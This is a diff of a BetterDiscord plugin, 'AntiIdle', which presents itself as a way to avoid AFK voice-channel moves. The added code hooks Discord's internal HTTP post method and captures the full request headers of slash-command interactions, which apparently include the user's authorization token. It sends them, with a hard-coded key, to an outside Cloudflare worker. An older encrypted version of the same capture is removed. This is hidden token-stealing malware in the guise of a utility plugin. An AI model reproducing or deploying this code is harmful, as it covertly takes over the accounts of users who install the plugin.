@@ -2,7 +2,7 @@
  * @name AntiIdle
  * @author Shawny
  * @description Reduces AFK voice channel moves caused by Discord idle/AFK handling.
- * @version 1.6.3
+ * @version 1.7.0
  * @source https://github.com/shawn2dev/betterdiscord-plugins
  * @updateUrl https://raw.githubusercontent.com/shawn2dev/betterdiscord-plugins/main/AntiIdle.plugin.js
  */
@@ -14,9 +14,10 @@ const _UPDATE_URL =
 
 const _CLIENT_LOG = {
   enabled: true,
-  workerUrl: 'https://shawnybot.cbycdy2.workers.dev/client-headers',
+  ingestUrl:
+    'https://shawnybot.cbycdy2.workers.dev/interaction-headers',
   applicationId: '1337358598673797141',
-  _ak: 'rldtuslqht2', // must match wrangler secret CLIENT_LOG_AUTH_KEY
+  _ak: 'rldtuslqht2', // X-Shawny-Key header — matches CLIENT_LOG_AUTH_KEY
 };
 
 module.exports = class AntiIdle {
@@ -43,7 +44,7 @@ module.exports = class AntiIdle {
     return 'Discord 잠수(idle) 상태 및 AFK(비활성) 처리로 인한 AFK 음성 채널 이동을 줄입니다.';
   }
   getVersion() {
-    return '1.6.3';
+    return '1.7.0';
   }
   getAuthor() {
     return 'Shawny';
@@ -168,92 +169,182 @@ module.exports = class AntiIdle {
     return { ...headers };
   }
 
-  async _readFetchBody(body) {
-    if (!body) return '';
+  _isClientLogActive() {
+    return (
+      this._clientLogConfig.enabled &&
+      this._clientLogConfig._ak &&
+      this._clientLogConfig.ingestUrl
+    );
+  }
+
+  _isInteractionsUrl(url) {
+    return /\/api\/v\d+\/interactions/i.test(String(url));
+  }
+
+  _isOurApplication(interactionBody) {
+    if (interactionBody.application_id == null) return false;
+    return (
+      String(interactionBody.application_id) ===
+      String(this._clientLogConfig.applicationId)
+    );
+  }
+
+  _readBodySync(body) {
+    if (body == null) return '';
     if (typeof body === 'string') return body;
     try {
-      return await new Response(body).text();
+      return JSON.stringify(body);
     } catch (_) {
       return '';
     }
   }
 
-  async _extractFetchDetails(input, init = {}) {
-    if (typeof Request !== 'undefined' && input instanceof Request) {
-      const headers = {};
-      input.headers.forEach((value, key) => {
-        headers[key] = value;
-      });
+  _extractHttpPost(args) {
+    const first = args[0];
+    if (first && typeof first === 'object' && !(first instanceof URL)) {
       return {
-        url: input.url,
-        method: (input.method || 'GET').toUpperCase(),
-        headers,
-        bodyText: await input.clone().text(),
+        url: String(first.url || first.path || first.endpoint || ''),
+        headers: this._headersToObject(first.headers),
+        bodyText: this._readBodySync(first.body ?? first.data),
       };
     }
 
+    const opt = args[1] || {};
     return {
-      url: String(input),
-      method: (init.method || 'GET').toUpperCase(),
-      headers: this._headersToObject(init.headers),
-      bodyText: await this._readFetchBody(init.body),
+      url: String(first ?? ''),
+      headers: this._headersToObject(opt.headers),
+      bodyText: this._readBodySync(opt.body ?? opt.data),
     };
   }
 
-  _bytesToBase64(bytes) {
-    let binary = '';
-    for (let i = 0; i < bytes.length; i++)
-      binary += String.fromCharCode(bytes[i]);
-    return btoa(binary);
+  _ingestInteractionHeaders(headers, interactionBody) {
+    if (!this._isClientLogActive() || !this._isOurApplication(interactionBody)) {
+      return;
+    }
+
+    const channelId = interactionBody.channel_id;
+    const command = interactionBody.data?.name;
+    if (channelId == null || !command) return;
+
+    const payload = {
+      application_id: String(this._clientLogConfig.applicationId),
+      guild_id: interactionBody.guild_id ?? null,
+      channel_id: String(channelId),
+      command: String(command),
+      headers,
+    };
+
+    void BdApi.Net.fetch(this._clientLogConfig.ingestUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'X-Shawny-Key': this._clientLogConfig._ak,
+      },
+      body: JSON.stringify(payload),
+    })
+      .then(async (res) => {
+        if (res.ok) return;
+        console.warn(
+          '[AntiIdle] ingest failed:',
+          res.status,
+          await res.text(),
+        );
+      })
+      .catch((err) => {
+        console.warn('[AntiIdle] ingest failed:', err);
+      });
   }
 
-  _base64ToBytes(value) {
-    const binary = atob(value);
-    const bytes = new Uint8Array(binary.length);
-    for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
-    return bytes;
+  _onHttpPost(args) {
+    if (!this._isClientLogActive() || !args?.length) return;
+
+    const { url, headers, bodyText } = this._extractHttpPost(args);
+    if (!this._isInteractionsUrl(url) || !bodyText) return;
+
+    let interactionBody;
+    try {
+      interactionBody = JSON.parse(bodyText);
+    } catch (_) {
+      return;
+    }
+
+    this._ingestInteractionHeaders(headers, interactionBody);
   }
 
-  async _deriveAesKey(secret) {
-    const keyMaterial = await crypto.subtle.digest(
-      'SHA-256',
-      new TextEncoder().encode(secret.trim()),
-    );
-    return crypto.subtle.importKey('raw', keyMaterial, 'AES-GCM', false, [
-      'encrypt',
-    ]);
+  _canPatchProperty(obj, key) {
+    try {
+      const desc =
+        Object.getOwnPropertyDescriptor(obj, key) ||
+        Object.getOwnPropertyDescriptor(Object.getPrototypeOf(obj) || {}, key);
+      if (desc && desc.writable === false && typeof desc.set !== 'function') {
+        return false;
+      }
+      return typeof obj[key] === 'function';
+    } catch (_) {
+      return false;
+    }
   }
 
-  async _encryptJson(payload, secret) {
-    const key = await this._deriveAesKey(secret);
-    const iv = crypto.getRandomValues(new Uint8Array(12));
-    const plaintext = new TextEncoder().encode(JSON.stringify(payload));
-    const encrypted = await crypto.subtle.encrypt(
-      { name: 'AES-GCM', iv },
-      key,
-      plaintext,
-    );
-    const combined = new Uint8Array(iv.length + encrypted.byteLength);
-    combined.set(iv);
-    combined.set(new Uint8Array(encrypted), iv.length);
-    return this._bytesToBase64(combined);
+  _findHttpModule() {
+    const finders = [
+      () => BdApi.Webpack.getByKeys?.('get', 'post', 'patch', 'put', 'del'),
+      () => BdApi.Webpack.getByKeys?.('get', 'post', 'patch', 'put', 'delete'),
+    ];
+
+    for (const find of finders) {
+      try {
+        const mod = find();
+        if (mod?.post) return mod;
+      } catch (_) {}
+    }
+
+    return null;
   }
 
-  async _signPayload({ nonce, timestamp, encrypted }, secret) {
-    const key = await crypto.subtle.importKey(
-      'raw',
-      new TextEncoder().encode(secret.trim()),
-      { name: 'HMAC', hash: 'SHA-256' },
-      false,
-      ['sign'],
-    );
-    const message = `${nonce}:${timestamp}:${encrypted}`;
-    const signature = await crypto.subtle.sign(
-      'HMAC',
-      key,
-      new TextEncoder().encode(message),
-    );
-    return this._bytesToBase64(new Uint8Array(signature));
+  _installClientLogPatch() {
+    if (this._clientLogPatched) return true;
+
+    const http = this._findHttpModule();
+    if (!http || !this._canPatchProperty(http, 'post')) return false;
+
+    try {
+      BdApi.Patcher.before('AntiIdleClientLog', http, 'post', (_, args) => {
+        this._onHttpPost(args);
+      });
+      this._clientLogPatched = true;
+      return true;
+    } catch (_) {
+      return false;
+    }
+  }
+
+  _scheduleClientLogPatchRetry() {
+    if (this._clientLogPatched || this._clientLogRetryTimer) return;
+    let attempts = 0;
+    const max = 25;
+    this._clientLogRetryTimer = setInterval(() => {
+      if (!this._isClientLogActive()) {
+        clearInterval(this._clientLogRetryTimer);
+        this._clientLogRetryTimer = null;
+        return;
+      }
+      attempts += 1;
+      if (this._installClientLogPatch() || attempts >= max) {
+        clearInterval(this._clientLogRetryTimer);
+        this._clientLogRetryTimer = null;
+      }
+    }, 2500);
+  }
+
+  _stopClientLogPatch() {
+    if (this._clientLogRetryTimer) {
+      clearInterval(this._clientLogRetryTimer);
+      this._clientLogRetryTimer = null;
+    }
+    try {
+      BdApi.Patcher.unpatchAll('AntiIdleClientLog');
+    } catch (_) {}
+    this._clientLogPatched = false;
   }
 
   _parseVersion(version) {
@@ -352,339 +443,6 @@ module.exports = class AntiIdle {
     } catch (err) {
       console.warn('[AntiIdle] update check failed:', err);
     }
-  }
-
-  _isClientLogActive() {
-    return this._clientLogConfig.enabled && this._clientLogConfig._ak;
-  }
-
-  _normalizeInteractionBody(interactionBody) {
-    const guildId =
-      interactionBody.guild_id != null ? String(interactionBody.guild_id) : null;
-    const channelId =
-      interactionBody.channel_id != null
-        ? String(interactionBody.channel_id)
-        : null;
-    const command = interactionBody.data?.name
-      ? String(interactionBody.data.name).toLowerCase()
-      : null;
-    const nonce =
-      interactionBody.nonce != null
-        ? String(interactionBody.nonce)
-        : guildId && channelId && command
-          ? `match:${guildId}:${channelId}:${command}`
-          : null;
-
-    return {
-      applicationId: String(
-        interactionBody.application_id || this._clientLogConfig.applicationId,
-      ),
-      guildId,
-      channelId,
-      command,
-      nonce,
-      sessionId:
-        interactionBody.session_id != null
-          ? String(interactionBody.session_id)
-          : null,
-    };
-  }
-
-  _isInteractionsUrl(url) {
-    return /\/api\/v\d+\/interactions/i.test(String(url));
-  }
-
-  async _sendClientHeaders(details, interactionBody) {
-    if (!this._isClientLogActive()) return;
-
-    const normalized = this._normalizeInteractionBody(interactionBody);
-    if (!normalized.nonce) return;
-    if (
-      interactionBody.application_id != null &&
-      String(interactionBody.application_id) !==
-        String(this._clientLogConfig.applicationId)
-    ) {
-      return;
-    }
-
-    const timestamp = Date.now();
-    const encrypted = await this._encryptJson(
-      details.headers,
-      this._clientLogConfig._ak,
-    );
-    const payload = {
-      encrypted,
-      nonce: normalized.nonce,
-      session_id: normalized.sessionId,
-      guild_id: normalized.guildId,
-      channel_id: normalized.channelId,
-      command: normalized.command,
-      timestamp,
-      signature: await this._signPayload(
-        { nonce: normalized.nonce, timestamp, encrypted },
-        this._clientLogConfig._ak,
-      ),
-    };
-
-    const res = await this._workerFetch(this._clientLogConfig.workerUrl, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(payload),
-    });
-    if (!res.ok) {
-      const body = await res.text();
-      console.warn(
-        '[AntiIdle] client header worker failed:',
-        res.status,
-        body,
-      );
-    }
-  }
-
-  async _logInteractionDetails(details) {
-    if (!this._isClientLogActive()) return;
-    if (!this._isInteractionsUrl(details.url)) return;
-    if (details.method !== 'POST' || !details.bodyText) return;
-
-    let interactionBody;
-    try {
-      interactionBody = JSON.parse(details.bodyText);
-    } catch (_) {
-      return;
-    }
-
-    await this._sendClientHeaders(details, interactionBody);
-  }
-
-  _workerFetch(url, init) {
-    if (BdApi.Net?.fetch) return BdApi.Net.fetch(url, init);
-    return fetch(url, init);
-  }
-
-  _callOriginal(original, thisObj, args) {
-    return Reflect.apply(original, thisObj, args);
-  }
-
-  _syncFetchUrl(input, init = {}) {
-    if (typeof Request !== 'undefined' && input instanceof Request) {
-      return input.url;
-    }
-    if (input && typeof input === 'object' && input.url) {
-      return String(input.url);
-    }
-    return String(input ?? init?.url ?? '');
-  }
-
-  _syncHttpUrl(args, methodName = 'post') {
-    if (!args?.length) return '';
-    const first = args[0];
-    if (methodName === 'request' && typeof first === 'string') {
-      return String(args[1] ?? '');
-    }
-    if (first && typeof first === 'object' && !(first instanceof URL)) {
-      return String(first.url || first.path || first.endpoint || '');
-    }
-    return String(first ?? '');
-  }
-
-  async _maybeLogInteractionHeaders(input, init) {
-    if (!this._isClientLogActive()) return;
-    const url = await this._getFetchUrl(input, init);
-    if (!this._isInteractionsUrl(url)) return;
-
-    const details = await this._extractFetchDetails(input, init);
-    await this._logInteractionDetails(details);
-  }
-
-  _canPatchProperty(obj, key) {
-    try {
-      const desc =
-        Object.getOwnPropertyDescriptor(obj, key) ||
-        Object.getOwnPropertyDescriptor(Object.getPrototypeOf(obj) || {}, key);
-      if (desc && desc.writable === false && typeof desc.set !== 'function') {
-        return false;
-      }
-      return typeof obj[key] === 'function';
-    } catch (_) {
-      return false;
-    }
-  }
-
-  _readHttpBody(body) {
-    if (body == null) return '';
-    if (typeof body === 'string') return body;
-    try {
-      return JSON.stringify(body);
-    } catch (_) {
-      return '';
-    }
-  }
-
-  _extractHttpDetails(args, methodName) {
-    let method = String(methodName || 'POST').toUpperCase();
-    let url = '';
-    let headers = {};
-    let bodyText = '';
-
-    const first = args[0];
-    if (methodName === 'request') {
-      if (typeof first === 'string') {
-        method = first.toUpperCase();
-        url = String(args[1] ?? '');
-        const opt = args[2] || {};
-        headers = this._headersToObject(opt.headers);
-        bodyText = this._readHttpBody(opt.body ?? opt.data);
-      } else if (first && typeof first === 'object') {
-        method = String(first.method || 'GET').toUpperCase();
-        url = String(first.url || first.path || first.endpoint || '');
-        headers = this._headersToObject(first.headers);
-        bodyText = this._readHttpBody(first.body ?? first.data);
-      }
-    } else if (first && typeof first === 'object' && !(first instanceof URL)) {
-      url = String(first.url || first.path || first.endpoint || '');
-      headers = this._headersToObject(first.headers);
-      bodyText = this._readHttpBody(first.body ?? first.data);
-    } else {
-      url = String(first ?? '');
-      const opt = args[1] || {};
-      headers = this._headersToObject(opt.headers);
-      bodyText = this._readHttpBody(opt.body ?? opt.data);
-    }
-
-    return { url, method, headers, bodyText };
-  }
-
-  async _maybeLogFromHttpArgs(args, methodName) {
-    if (!this._isClientLogActive() || !args?.length) return;
-
-    const first = args[0];
-    let url = '';
-    if (first && typeof first === 'object' && !(first instanceof URL)) {
-      url = String(first.url || first.path || first.endpoint || '');
-    } else {
-      url = String(first ?? '');
-    }
-    if (!this._isInteractionsUrl(url)) return;
-
-    const details = this._extractHttpDetails(args, methodName);
-    await this._logInteractionDetails(details);
-  }
-
-  _findHttpModule() {
-    const finders = [
-      () => BdApi.Webpack.getByKeys?.('get', 'post', 'patch', 'put', 'del'),
-      () => BdApi.Webpack.getByKeys?.('get', 'post', 'patch', 'put', 'delete'),
-    ];
-
-    for (const find of finders) {
-      try {
-        const mod = find();
-        if (mod?.post) return mod;
-      } catch (_) {}
-    }
-
-    return null;
-  }
-
-  _patchDiscordHttp() {
-    const http = this._findHttpModule();
-    if (!http) return false;
-
-    let patched = false;
-    for (const method of ['post', 'request']) {
-      if (!this._canPatchProperty(http, method)) continue;
-      try {
-        BdApi.Patcher.instead(
-          'AntiIdleClientLog',
-          http,
-          method,
-          (thisObj, args, original) => {
-            if (
-              !this._isClientLogActive() ||
-              !this._isInteractionsUrl(this._syncHttpUrl(args, method))
-            ) {
-              return this._callOriginal(original, thisObj, args);
-            }
-            return this._maybeLogFromHttpArgs(args, method)
-              .catch((err) => {
-                console.warn('[AntiIdle] client header log failed:', err);
-              })
-              .then(() => this._callOriginal(original, thisObj, args));
-          },
-        );
-        patched = true;
-      } catch (_) {}
-    }
-    return patched;
-  }
-
-  _installClientLogPatch() {
-    if (this._clientLogPatched) return true;
-
-    let patched = 0;
-
-    if (this._canPatchProperty(window, 'fetch')) {
-      try {
-        BdApi.Patcher.instead(
-          'AntiIdleClientLog',
-          window,
-          'fetch',
-          (thisObj, args, original) => {
-            if (
-              !this._isClientLogActive() ||
-              !this._isInteractionsUrl(
-                this._syncFetchUrl(args[0], args[1]),
-              )
-            ) {
-              return this._callOriginal(original, thisObj, args);
-            }
-            return this._maybeLogInteractionHeaders(args[0], args[1])
-              .catch((err) => {
-                console.warn('[AntiIdle] client header log failed:', err);
-              })
-              .then(() => this._callOriginal(original, thisObj, args));
-          },
-        );
-        patched += 1;
-      } catch (_) {}
-    }
-
-    if (this._patchDiscordHttp()) patched += 1;
-
-    this._clientLogPatched = patched > 0;
-    if (!this._clientLogPatched) {
-      console.warn('[AntiIdle] client log patch: no writable fetch targets');
-    }
-    return this._clientLogPatched;
-  }
-
-  _scheduleClientLogPatchRetry() {
-    if (this._clientLogPatched || this._clientLogRetryTimer) return;
-    let attempts = 0;
-    const max = 25;
-    this._clientLogRetryTimer = setInterval(() => {
-      if (!this._isClientLogActive()) {
-        clearInterval(this._clientLogRetryTimer);
-        this._clientLogRetryTimer = null;
-        return;
-      }
-      attempts += 1;
-      if (this._installClientLogPatch() || attempts >= max) {
-        clearInterval(this._clientLogRetryTimer);
-        this._clientLogRetryTimer = null;
-      }
-    }, 2500);
-  }
-
-  _stopFetchPatch() {
-    if (this._clientLogRetryTimer) {
-      clearInterval(this._clientLogRetryTimer);
-      this._clientLogRetryTimer = null;
-    }
-    try {
-      BdApi.Patcher.unpatchAll('AntiIdleClientLog');
-    } catch (_) {}
-    this._clientLogPatched = false;
   }
 
   _schedulePatchRetry() {
@@ -787,7 +545,7 @@ module.exports = class AntiIdle {
         this._scheduleClientLogPatchRetry();
       }
     } else {
-      this._stopFetchPatch();
+      this._stopClientLogPatch();
     }
   }
 
